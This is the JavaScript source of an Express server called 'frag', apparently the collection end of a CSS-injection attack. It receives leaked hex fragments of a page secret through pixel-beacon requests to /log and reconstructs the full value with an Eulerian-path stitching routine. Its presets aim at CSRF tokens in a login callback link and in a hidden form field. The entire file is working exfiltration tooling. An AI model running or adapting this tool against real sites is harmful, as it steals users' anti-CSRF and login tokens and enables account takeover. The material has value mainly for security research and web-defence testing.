const express = require('express');
const path = require('path');
const crypto = require('crypto');

const G = '\x1b[32m';
const R = '\x1b[31m';
const Y = '\x1b[33m';
const D = '\x1b[2m';
const B = '\x1b[1m';
const X = '\x1b[0m';

function printBanner() {
  console.log(String.raw`
                                      \ | /
                                    -- * --
                                     / | \
                                ____/
                              _/
                           __/__
                          /_____/
               __________/     /
              /          \____/
             /                \          _______
            /                  \        /       \
           /     __________     \      /   c2e   \
          /     /          \     \     \         /
         /     /            \     \     \_______/
        /     /    {    }    \     /
        \     \              /   /         _______
         \     \____________/   /         /       \
          \                    /         /   2e1   \
           \                  /          \         /
            \                /            \_______/
             \______________/
                                          _______
                                         /       \
                                        /   e16   \
                                        \         /
                                         \_______/

          ______  _____       _       ____
         |  ____||  __ \     / \     / ___|
         | |__   | |__) |   / _ \   | |  _
         |  __|  |  _  /   / ___ \  | |_| |
         |_|     |_| \_\  /_/   \_\  \____|
`);
}

const PRESETS = {
  anchor: {
    selector: 'a[href^="https://example.com/m/callback/email?token="]',
    attribute: 'href',
    tokenName: 'CSRF token',
    startSelector: 'token=',
    endSelector: '&operation=login',
    tokenLength: 40,
  },
  hidden: {
    selector: 'input[type="hidden"][name="csrf"]',
    attribute: 'value',
    tokenName: 'csrf',
    startSelector: '',
    endSelector: '',
    tokenLength: 40,
  },
};

function parseSelector(selector) {
  const tagMatch = selector.match(/^([\w-]+)/);
  const tag = tagMatch ? tagMatch[1] : 'div';

  const prefixMatch = selector.match(/\[[\w-]+\^="([^"]*)"\]/);
  const selectorPrefix = prefixMatch ? prefixMatch[1] : '';

  return { tag, selectorPrefix };
}

function tryStitch(data, windowSize = 3, contextChunks = new Set(), tokenLength = 0) {
  if (!data.start || !data.end) return null;

  const edgeSize = windowSize - 1;
  const hexPattern = new RegExp('^[0-9a-f]{' + windowSize + '}$');
  if (!hexPattern.test(data.start) || !hexPattern.test(data.end)) return null;

  const allChunks = [...new Set([...data.chunks, data.start, data.end])]
    .filter(c => hexPattern.test(c));

  function bfsFilter(chunks) {
    const fwd = {};
    for (const c of chunks) {
      const p = c.substring(0, edgeSize);
      (fwd[p] || (fwd[p] = [])).push(c);
    }
    const fwdSet = new Set();
    let queue = [data.start];
    while (queue.length) {
      const c = queue.shift();
      if (fwdSet.has(c)) continue;
      fwdSet.add(c);
      for (const n of fwd[c.substring(c.length - edgeSize)] || []) {
        if (!fwdSet.has(n)) queue.push(n);
      }
    }

    const bwd = {};
    for (const c of chunks) {
      const s = c.substring(c.length - edgeSize);
      (bwd[s] || (bwd[s] = [])).push(c);
    }
    const bwdSet = new Set();
    queue = [data.end];
    while (queue.length) {
      const c = queue.shift();
      if (bwdSet.has(c)) continue;
      bwdSet.add(c);
      for (const n of bwd[c.substring(0, edgeSize)] || []) {
        if (!bwdSet.has(n)) queue.push(n);
      }
    }

    return [...fwdSet].filter(c => bwdSet.has(c));
  }

  let filtered = bfsFilter(allChunks);
  if (filtered.length < 2) return null;

  const startNode = data.start.substring(0, edgeSize);
  const endNode = data.end.substring(data.end.length - edgeSize);

  function computeDeficits(chunks) {
    const od = {}, id = {};
    for (const c of chunks) {
      const f = c.substring(0, edgeSize), t = c.substring(c.length - edgeSize);
      od[f] = (od[f] || 0) + 1;
      id[t] = (id[t] || 0) + 1;
    }
    const nodes = new Set();
    for (const c of chunks) {
      nodes.add(c.substring(0, edgeSize));
      nodes.add(c.substring(c.length - edgeSize));
    }
    const deficits = {};
    for (const node of nodes) {
      let d = (od[node] || 0) - (id[node] || 0);
      if (node === startNode) d -= 1;
      if (node === endNode) d += 1;
      if (d !== 0) deficits[node] = d;
    }
    return { deficits, od, id };
  }

  function findEulerPath(chunks) {
    const outEdges = {};
    const od = {}, id = {};
    const graphNodes = new Set();

    for (const chunk of chunks) {
      const from = chunk.substring(0, edgeSize);
      const to = chunk.substring(chunk.length - edgeSize);
      graphNodes.add(from);
      graphNodes.add(to);
      (outEdges[from] || (outEdges[from] = [])).push(chunk);
      od[from] = (od[from] || 0) + 1;
      id[to] = (id[to] || 0) + 1;
    }

    const sources = [], sinks = [];
    for (const node of graphNodes) {
      let deficit = (od[node] || 0) - (id[node] || 0);
      if (node === startNode) deficit -= 1;
      if (node === endNode) deficit += 1;
      for (let i = 0; i < Math.abs(deficit); i++) {
        if (deficit < 0) sources.push(node);
        else if (deficit > 0) sinks.push(node);
      }
    }

    if (sources.length !== sinks.length) return null;

    const edgeMult = {};
    for (const chunk of chunks) edgeMult[chunk] = 1;

    if (sources.length > 0) {
      const spaths = {};
      for (const src of new Set(sources)) {
        const visited = new Set([src]);
        const q = [[src, []]];
        const found = {};
        while (q.length) {
          const [node, path] = q.shift();
          if (path.length > 0 && !(node in found)) found[node] = path;
          for (const chunk of (outEdges[node] || [])) {
            const to = chunk.substring(chunk.length - edgeSize);
            if (!visited.has(to)) {
              visited.add(to);
              q.push([to, [...path, chunk]]);
            }
          }
        }
        spaths[src] = found;
      }

      let bestCost = Infinity;
      let bestPaths = null;

      function matchSinks(i, usedSinks, paths, cost) {
        if (i === sources.length) {
          if (cost < bestCost) {
            bestCost = cost;
            bestPaths = paths.map(p => [...p]);
          }
          return;
        }
        if (cost >= bestCost) return;
        for (let j = 0; j < sinks.length; j++) {
          if (usedSinks.has(j)) continue;
          const p = spaths[sources[i]]?.[sinks[j]];
          if (!p) continue;
          usedSinks.add(j);
          paths.push(p);
          matchSinks(i + 1, usedSinks, paths, cost + p.length);
          paths.pop();
          usedSinks.delete(j);
        }
      }

      matchSinks(0, new Set(), [], 0);
      if (!bestPaths) return null;

      for (const path of bestPaths) {
        for (const chunk of path) {
          edgeMult[chunk] = (edgeMult[chunk] || 0) + 1;
        }
      }
    }

    let eidx = 0;
    const multiEdges = {};
    for (const chunk of chunks) {
      const from = chunk.substring(0, edgeSize);
      if (!multiEdges[from]) multiEdges[from] = [];
      for (let i = 0; i < edgeMult[chunk]; i++) {
        multiEdges[from].push({ chunk, idx: eidx++ });
      }
    }
    const totalEdges = eidx;

    const used = new Set();
    const ptrs = {};
    const stack = [{ node: startNode, chunk: null }];
    const circuit = [];

    while (stack.length) {
      const top = stack[stack.length - 1];
      const edges = multiEdges[top.node] || [];
      if (ptrs[top.node] === undefined) ptrs[top.node] = 0;

      let found = false;
      while (ptrs[top.node] < edges.length) {
        const edge = edges[ptrs[top.node]];
        ptrs[top.node]++;
        if (!used.has(edge.idx)) {
          used.add(edge.idx);
          const to = edge.chunk.substring(edge.chunk.length - edgeSize);
          stack.push({ node: to, chunk: edge.chunk });
          found = true;
          break;
        }
      }

      if (!found) {
        circuit.push(stack.pop());
      }
    }

    circuit.reverse();

    if (used.size !== totalEdges) return null;
    if (circuit[circuit.length - 1].node !== endNode) return null;

    let token = circuit[0].node;
    const selfLoopPositions = [];
    for (let i = 1; i < circuit.length; i++) {
      const chunk = circuit[i].chunk;
      if (chunk.substring(0, edgeSize) === chunk.substring(chunk.length - edgeSize)) {
        selfLoopPositions.push({ pos: token.length, char: chunk[edgeSize] });
      }
      token += chunk[edgeSize];
    }

    if (token.substring(0, windowSize) !== data.start ||
        token.substring(token.length - windowSize) !== data.end) {
      return null;
    }

    return { token, selfLoopPositions };
  }

  let result = findEulerPath(filtered);

  if (contextChunks.size > 0) {
    const { deficits } = computeDeficits(filtered);
    const toRemove = new Set();
    for (const chunk of filtered) {
      if (!contextChunks.has(chunk)) continue;
      const from = chunk.substring(0, edgeSize);
      const to = chunk.substring(chunk.length - edgeSize);
      if ((deficits[from] || 0) > 0 && (deficits[to] || 0) < 0) {
        toRemove.add(chunk);
      }
    }
    if (toRemove.size > 0) {
      const remaining = filtered.filter(c => !toRemove.has(c));
      const refiltered = bfsFilter(remaining);
      if (refiltered.length === remaining.length) {
        const cleanResult = findEulerPath(refiltered);
        if (cleanResult) {
          if (!result) {
            result = cleanResult;
          } else if (tokenLength > 0) {
            const cleanMatch = cleanResult.token.length === tokenLength;
            const rawMatch = result.token.length === tokenLength;
            if (cleanMatch && !rawMatch) result = cleanResult;
            else if (!cleanMatch && !rawMatch && cleanResult.token.length <= result.token.length) result = cleanResult;
          } else if (cleanResult.token.length <= result.token.length) {
            result = cleanResult;
          }
        }
      }
    }
  }

  if (!result) {
    let current = filtered;
    let removed = true;
    while (removed && !result) {
      removed = false;
      const { deficits } = computeDeficits(current);

      for (const chunk of current) {
        const from = chunk.substring(0, edgeSize);
        const to = chunk.substring(chunk.length - edgeSize);
        if ((deficits[from] || 0) > 0 && (deficits[to] || 0) < 0) {
          const remaining = current.filter(c => c !== chunk);
          const refiltered = bfsFilter(remaining);
          if (refiltered.length === remaining.length) {
            current = remaining;
            removed = true;
            result = findEulerPath(current);
            break;
          }
        }
      }
    }
  }

  if (!result) return null;

  if (tokenLength > 0 && result.selfLoopPositions.length === 0 && result.token.length !== tokenLength) {
    return null;
  }

  if (result.selfLoopPositions.length === 0) {
    return { token: result.token, length: result.token.length };
  }

  const loops = result.selfLoopPositions;
  const maxExtra = 3;
  const combos = [];
  const counts = loops.map(() => 0);

  while (true) {
    let t = result.token;
    let offset = 0;
    for (let i = 0; i < loops.length; i++) {
      if (counts[i] > 0) {
        const pos = loops[i].pos + offset;
        t = t.slice(0, pos + 1) + loops[i].char.repeat(counts[i]) + t.slice(pos + 1);
        offset += counts[i];
      }
    }
    combos.push(t);

    let carry = true;
    for (let i = loops.length - 1; i >= 0 && carry; i--) {
      counts[i]++;
      if (counts[i] > maxExtra) { counts[i] = 0; } else { carry = false; }
    }
    if (carry) break;
  }

  const filtered_combos = tokenLength > 0 ? combos.filter(c => c.length === tokenLength) : combos;
  const final = filtered_combos.length > 0 ? filtered_combos : combos;

  if (final.length === 1) {
    return { token: final[0], length: final[0].length };
  }
  return {
    token: final[0],
    length: final[0].length,
    candidates: final,
  };
}

const PIXEL = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

function buildConfig(userConfig) {
  const { tag, selectorPrefix } = parseSelector(userConfig.selector);
  const attribute = userConfig.attribute || 'href';
  const tokenLength = userConfig.tokenLength || 40;
  const sampleToken = crypto.randomBytes(Math.ceil(tokenLength / 2)).toString('hex').slice(0, tokenLength);
  const valuePrefix = selectorPrefix || userConfig.startSelector;
  const sampleExtra = userConfig.endSelector ? '&state=medium&rememberMe=false' : '';
  const sampleValue = valuePrefix + sampleToken + userConfig.endSelector + sampleExtra;

  let sampleHtml;
  if (tag === 'input') {
    const attrs = [...userConfig.selector.matchAll(/\[([\w-]+)="([^"]*)"\]/g)]
      .filter(([, name]) => name !== attribute);
    let attrStr = attrs.map(([, name, value]) => `${name}="${value}"`).join(' ');
    if (attrStr) attrStr = ' ' + attrStr;
    sampleHtml = `<input${attrStr} ${attribute}="${sampleValue}"><span style="color:#e0e0e0;word-break:break-all;font-size:13px">${sampleValue}</span>`;
  } else {
    sampleHtml = `<${tag} ${attribute}="${sampleValue}">${sampleValue}</${tag}>`;
  }

  const startContext = userConfig.startSelector ? userConfig.startSelector.slice(-2) : '';
  const endContext = userConfig.endSelector ? userConfig.endSelector.slice(0, 2) : '';

  const contextHexChunks = new Set();
  const hexRe = /^[0-9a-f]{3}$/;
  for (const str of [sampleValue.replace(sampleToken, ''), valuePrefix, userConfig.endSelector || '', sampleExtra]) {
    for (let i = 0; i <= str.length - 3; i++) {
      const c = str.substring(i, i + 3);
      if (hexRe.test(c)) contextHexChunks.add(c);
    }
  }

  return {
    config: {
      selector: userConfig.selector,
      tokenName: userConfig.tokenName,
      attribute,
      tag,
      startContext,
      endContext,
      useStartsWith: !userConfig.startSelector,
      useEndsWith: !userConfig.endSelector,
      sampleToken,
      sampleHtml,
      tokenLength,
    },
    contextHexChunks,
  };
}

const app = express();
const PORT = 3000;

let currentConfig, contextHexChunks, tokenLength, state;

function applyConfig(userConfig) {
  const result = buildConfig(userConfig);
  currentConfig = result.config;
  contextHexChunks = result.contextHexChunks;
  tokenLength = currentConfig.tokenLength;
  state = { start: null, end: null, chunks: [], dirty: true, cached: null };
}

applyConfig(PRESETS.anchor);

app.use(express.static(path.join(__dirname, 'public')));
app.use('/graphics', express.static(path.join(__dirname, 'graphics')));
app.use(express.json());

app.get('/config', (req, res) => res.json(currentConfig));

app.post('/api/config', (req, res) => {
  applyConfig(req.body);
  console.log(`\n${G}${B}config updated${X}`);
  console.log(`${D}selector: ${currentConfig.selector}${X}`);
  console.log(`${D}attribute: ${currentConfig.attribute}${X}`);
  console.log(`${D}length: ${currentConfig.tokenLength}${X}\n`);
  res.json(currentConfig);
});

app.get('/log', (req, res) => {
  const { t, c } = req.query;

  switch (t) {
    case 's':
      state = { start: c, end: null, chunks: [], dirty: true, cached: null };
      console.log(`\n${G}--- new extraction ---${X}`);
      console.log(`${D}start:${X} ${c}`);
      res.type('gif').send(PIXEL);
      break;
    case 'e':
      state.end = c;
      state.dirty = true;
      console.log(`${D}end:${X}   ${c}`);
      res.type('gif').send(PIXEL);
      break;
    case 'm':
      state.chunks.push(c);
      state.dirty = true;
      console.log(`${D}chunk #${state.chunks.length}:${X} ${c}`);
      res.type('gif').send(PIXEL);
      break;
    default:
      res.redirect('/api/token');
      break;
  }
});

app.get('/api/token', (req, res) => {
  if (!state.start) {
    return res.json({ status: 'waiting' });
  }
  if (!state.dirty && state.cached) {
    return res.json(state.cached);
  }
  const result = tryStitch(state, 3, contextHexChunks, tokenLength);
  if (result) {
    if (result.candidates) {
      console.log(`\n${Y}${B}ambiguous (${result.candidates.length} candidates, ${result.length} chars):${X}`);
      result.candidates.forEach(c => console.log(`  ${c}`));
    } else {
      console.log(`\n${G}${B}recovered token (${result.length} chars):${X} ${result.token}`);
    }
    state.cached = { status: 'ok', token: result.token, length: result.length, candidates: result.candidates };
  } else {
    state.cached = {
      status: 'partial',
      start: state.start,
      end: state.end,
      chunks: state.chunks.length,
    };
  }
  state.dirty = false;
  res.json(state.cached);
});

app.get('/api/reset', (req, res) => {
  state = { start: null, end: null, chunks: [], dirty: true, cached: null };
  console.log(`${D}state reset${X}`);
  res.json({ status: 'ok' });
});

app.listen(PORT, () => {
  printBanner();
  console.log(`${G}${B}frag${X} listening on ${B}http://localhost:${PORT}${X}`);
  console.log(`${D}visit http://localhost:${PORT} in your browser to get started${X}\n`);
});
